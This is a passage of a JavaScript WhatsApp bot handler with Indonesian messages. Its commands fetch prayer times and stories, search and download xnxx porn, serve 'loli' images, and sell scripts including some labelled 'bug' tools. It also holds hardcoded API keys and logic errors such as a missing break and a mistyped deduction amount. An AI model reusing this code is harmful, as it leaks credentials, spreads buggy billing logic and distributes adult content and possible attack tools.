text += `Dhuha : ${data.result.dhuha}\n`
text += `Dzuhur : ${data.result.dzuhur}\n`
text += `Ashar : ${data.result.ashar}\n`
text += `Maghrib : ${data.result.imsak}\n`
text += `Isya : ${data.result.isya}`
reply(text)
})
.catch(console.error)
break
case 'cerpen':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apiikey=${apiikey}`)
var textpp = `Title : ${data.result.title}\n`
textpp += `Creator : ${data.result.creator}\n`
textpp += `Story :\n${data.result.cerpen}`
reply(textpp)
break
case 'kisahnabi':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
await Biiofc
if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
axios
.get(`https://api.lolhuman.xyz/api/kisahnabi/${args[0]}?apiikey=${apiikey}`)
.then(({ data }) => {
var text = `Name : ${data.result.name}\n`
text += `Lahir : ${data.result.thn_kelahiran}\n`
text += `Umur : ${data.result.age}\n`
text += `Tempat : ${data.result.place}\n`
text += `Story : \n${data.result.story}`
reply(text)
})
.catch(console.error)
break
case 'katanime':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
let res = await (await
fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) throw await res.text()
  let json = await res.json()
  if(!json.result[0]) throw json
  let { indo, character, anime } = json.result[0]
m.reply(`${indo}\n\n${character}\n${anime}`)
}
break
case 'npmstalk':{
if (!q) return reply(`Example ${prefix+command} xeonapi`)
reply(mess.wait)
eha = await npmstalk.npmstalk(q)
reply(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'xnxxsearch':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝗷𝗮𝗽𝗮𝗻𝘀𝗲`)
reply(mess.wait)
let anu = await fetchJson(`https://xzn.wtf/api/xnxxsearch?title=${text}&apikey=JaaTzy`)
let teks = ``
for (let v of anu) {
teks += `*Title* : ${v.title}\n`
teks += `*Duration* : ${v.duration}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}
reply(teks) 
}
break 
case 'xnxxdl':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)    
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝘂𝗿𝗹`)
reply(mess.wait)
let anu = await fetchJson(`https://xzn.wtf/api/xnxxdl?urlxnxx=${text}&apikey=JaaTzy`)
const cpt = anu.title
const nick = anu.quality
Biiofc.sendMessage(m.chat, { video: { url: anu.url}, caption: `Judul : ${cpt}\nQuality : ${nick}`}, {quoted: m})
}
break   

case 'animespank':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
reply(mess.wait)
waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
await Biiofc.sendMessage(m.chat, { caption:  `𝗧𝗮𝗻𝗴𝗴𝘂𝗻𝗴 𝗗𝗼𝘀𝗮 𝗞𝗮𝗸`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
return(mess.error)
})
break
case 'walpaperanime': {
reply(mess.wait)
Biiofc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/wallnime?apikey=haikalgans`}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`})
}
break
case 'loli': {
reply(mess.wait)
Biiofc.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/randomimganime/loli`}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`})
}
break
case 'cosplay': {
reply(mess.wait)
Biiofc.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/randomimganime/cosplay`}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`})
}
break
case 'cecan':
case 'china':
case 'cogan':
case 'indonesia':
case 'korea':
case 'malaysia':
case 'thailand':
case 'vietnam': {
reply(mess.wait)
let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/${prefix+command}.json`)
result = anu[Math.floor(Math.random() * anu.length)]               
Biiofc.sendMessage(m.chat, { image: { url: result}, caption: '𝗗𝗼𝗻𝗲 𝗞𝗮𝗸' }, { quoted: m })
}
break  
case 'waifu': {
reply(mess.wait)
Biiofc.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/randomimganime/waifu`}, caption: `𝗗𝗼𝗻𝗲 𝗸𝗮𝗸`})
}
break 
case 'reportbug':{
let ripotbug = args[0]
if (!text) return reply('Teksnya?')
reply('Oke Kak Reportmu Sudah Terkirim Ke Owner')
Biiofc.sendMessage('6282192773770@s.whatsapp.net', { text: `===[ 𝗥𝗘𝗣𝗢𝗥𝗧 ]===\n𝗣𝗲𝘀𝗮𝗻 : ${q} , 𝗱𝗮𝗿𝗶 : @${sender.split('@')[0]}\n𝗸𝗲𝘁𝗶𝗸 ${prefix}accreport 𝘂𝗻𝘁𝘂𝗸 𝗸𝗼𝗻𝗳𝗶𝗿𝗺𝗮𝘀𝗶 , 𝗸𝗲𝘁𝗶𝗸 ${prefix}acc 𝗺𝗲𝗻𝗼𝗹𝗮𝗸 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶`, mentions: [sender]}, { quoted: fkontak })
}
break
case 'ai': case 'openai':
try {
if (global.keyopenai === '') return reply("Api key limi exceeded");
if (!q) return reply(`Chat with AI.\n\nExample:\n${prefix + command} What is coding`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: q,
temperature: 0.3,
max_tokens: 2000,
top_p: 1.0,
frequency_penalty: 0.0,
presence_penalty: 0.0,
});
reply(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
reply("Sorry, there seems to be an error :"+ error.message);
}
}
break
case "aimage":
try {
if (global.keyopenai === '') return reply("Apikey limit exceeded");
if (!q) return reply(`Generate image from AI.\n\nExample:\n${prefix + command} man riding horse`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
Biiofc.sendImage(from, response.data.data[0].url, text, m);
} catch (err) {
console.log(err);
reply("Sorry, there seems to be an error :"+ err);
}
break
case 'remini': {
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			XeonStickWait()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			Biiofc.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: m})
			}
			break
case 'acc': case 'addsaldo':{
if (!isOwner) return reply('NGAPAIN YATIM JAHANAM?')
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
reply(`「 *SALDO USER* 」
⭔ID: @${sender.split("@")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
                }
        case 'kirim': {
                    let messageText = `DONE KAK DEPOSIT SUDAH BERHASIL SEJUMLAH  ${q.split(",")[1]} TELAH DITAMBAHKAN KE SALDO ANDA CEK SALDO KETIK .SALDO TERIMAKASIH`
  let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  Biiofc.sendMessage(targetNumber, {
    text: `*${messageText}*`,
    mentions: [sender]
  }, {
    quoted: hw
  }).then(() => {
    m.reply('Acc Berhasil Tuan✅');
  }).catch(() => {
    m.reply('Gagal mengirim pesan!');
  });
}
break;
case "reqpanel": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *REQUEST PANEL* )▭▬▭

Ram : 
Username :
Nomor Wa : 
*Garansi 15 Day*
*Create ${tanggal}*
*Hari Ini ${hariini}*

⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
 Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, hardznum], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
 case 'shutdown':
if (!isOwner) return reply(mess.owner)
reply(`Ba bye...`)
await sleep(3000)
process.exit()
break 
case 'mlstalk': {
if (!isPremium) return replyprem(mess.premium)
if (!q) return reply(`Example ${prefix+command} 530793138|8129`)
reply(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
reply(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break    
 case 'sc': case 'script':{
let text_sc =`_${pushname}👋_\n`
text_sc += "*SCRIPT NO ENC+NO SCAN*\n"
text_sc += "Mau beli scriptnya?\n\n"
text_sc += "*Contact Person 📞*\n"
text_sc += "https://wa.me/6282192773770\n\n"
text_sc += "*Pembayaran Via* 💳\n"
text_sc += "_Qris / Dana / Gopay_\n\n"
text_sc += "*Harga : Rp18.000 (18K)*\n"
text_sc += "Sudah termasuk tutorial.\n"
text_sc += "Size script sudah ringan.\n"
text_sc += "Anti ngelag/delay."
m.reply(text_sc)
}
break        
        
 case 'tiktok':{ 
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./freya/tiktok').Tiktok(q).then( data => {
Biiofc.sendMessage(m.chat, { caption: `Sukses, Ini Tuan Video Nya`, video: { url: data.watermark }}, {quoted:m})
})
}
break      
case 'runtime':
m.reply(`*Runtime :* ${runtime(process.uptime())}`)
        break    
 case 'spekram':{  
if (!isOwner & isPremium) return reply(`Ngapain ? Khusus Hz Offcial Aja !!`)
let totalStorage = Math.floor(os.totalmem() / 1024 / 1024) + 'MB'
  let freeStorage = Math.floor(os.freemem() / 1024 / 1024) + 'MB'
  let cpuModel = os.cpus()[0].model
  let cpuSpeed = os.cpus()[0].speed / 1000
  let cpuCount = os.cpus().length

  let message = `

*Your Bot Specifications*:

• *Total Storage*: ${totalStorage}
• *Free Storage*: ${freeStorage}
• *CPU Model*: ${cpuModel}
• *CPU Speed*: ${cpuSpeed} GHz
• *Number of CPU Cores*: ${cpuCount}
`


m.reply(message)
}
break
  case 'saldo':{
reply(`*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${pushname}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

*Note :*
_Saldo hanya bisa untuk beli di bot_
_Tidak bisa ditarik atau transfer_!`)
}
break
          case 'qris': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/e725b89efe293f156b9bb.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case 'orkut': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/e725b89efe293f156b9bb.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case 'dana': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/940aef6a0b187dc4a6a18.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
          case 'bri': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/16455c651bb586fc20443.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case "deposit":
        depo = `PILIH PAYMENT DEPOSIT DIBAWAH DAN SEBUTKAN NOMINALNYA
contoh : ${prefix}dana 5000

${prefix}dana✅
${prefix}qris✅
${prefix}bri✅
${prefix}orkut✅
${prefix}gopay❎`
        Biiofc.sendMessage(from, {text : depo}, {quoted : hw}) 
        break      
 case 'bukti':{
           let jumlah = args[0]
           if (!jumlah) return reply('Jumblah nya?')
reply('OKE KAK DEPOSIT SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT')
Biiofc.sendMessage(`${owner}@s.whatsapp.net`, { text: `*ADA YANG DEPOSIT NIH*\n*SEJUMLAH ${jumlah} DARI @${sender.split('@')[0]}*\n*INGIN ACC DEPOSIT? KETIK*\n*${prefix}acc MAU NOLAK? BIARIN AJA*`, mentions: [sender]}, { quoted: hw })
        }
        break
case 'accreport': {
let messageText = `_Terima Kasih Atas Laporan Anda Dan Laporan Anda Diterima Tunggu 1 - 2 Hari Agar Owner Bisa Memperbaikinya`
  let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  Biiofc.sendMessage(targetNumber, {
    text: `*${messageText}*`,
    mentions: [sender]
  }, {
    quoted: hw
  }).then(() => {
    m.reply('Acc berhasil!');
  }).catch(() => {
    m.reply('Gagal mengirim pesan!');
  });
}
break    
case 'buyscpanel': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/g26mwz05enfd02p/Sc+Cpanel.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbugv1': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xfw5xe4mprrlrq9/Sc_Bug_V1.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbugv2': {
       if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xuzamc8oayprn4k/Sc_Bug_V2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbugv3': {
       if (cekSaldo(sender,db_saldo) < 35000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 35000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/l76f8btgfpqln9z/Sc_Bug_V3.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv2': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/aji3jug4bcadtyt/Sc_v2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv3': {
       if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/pxnzy1l8a8oyxb7/Sc_v3.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv3subdo': {
       if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 30000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/q8bzkjtt4qk8fsc/Sc_v3_Subdo.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv4': {
       if (cekSaldo(sender,db_saldo) < 35000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 35000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/y8po44xpgjqg1g8/ScCampuranV4.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv5': {
       if (cekSaldo(sender,db_saldo) < 55000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 55000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/7i55w043gwd39i9/Sc+v5+Full+Otomatis.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv6': {
       if (cekSaldo(sender,db_saldo) < 60000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp60.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 60000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/6el6pwjzu1dbn60/Sc%252Bv6.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv6subdo': {
       if (cekSaldo(sender,db_saldo) < 70000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp70.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 70000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/ivhjsn8calgpaak/Sc+v6.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv7otp': {
       if (cekSaldo(sender,db_saldo) < 75000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp75.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 75000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/fsvfy6ia24t2ctg/Sc+v7.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv7addpm2': {
       if (cekSaldo(sender,db_saldo) < 85000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp85.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 85000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/ucp2nsjzgm8fnzs/Sc+v7+Fitur+Addpm2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv8': {
       if (cekSaldo(sender,db_saldo) < 95000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp95.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 9.5000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/wgn9xu2plg46z75/Sc+Campuran+v8.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjagagrupv1': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/jaxgd3mdrxjkszb/Sc_Jaga_Grup.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjagagrupv2': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/fnbxdwor0ldky84/JagaGrup+V2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscpushkontak': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xdh4ocswkkt7tt2/BotSaveContact.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv191': {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/6kfjfrh6zdsh0yt/Sc+Hw+19+By+Rafathar+Offcial.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv192': {
       if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xgsig9ks6frk33f/Sc+Hw+19+Campuran.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv201': {
       if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 30000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/ms5ku2ln12eejys/Hw+v20+Enc.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv202': {
       if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 45000, db_saldo)
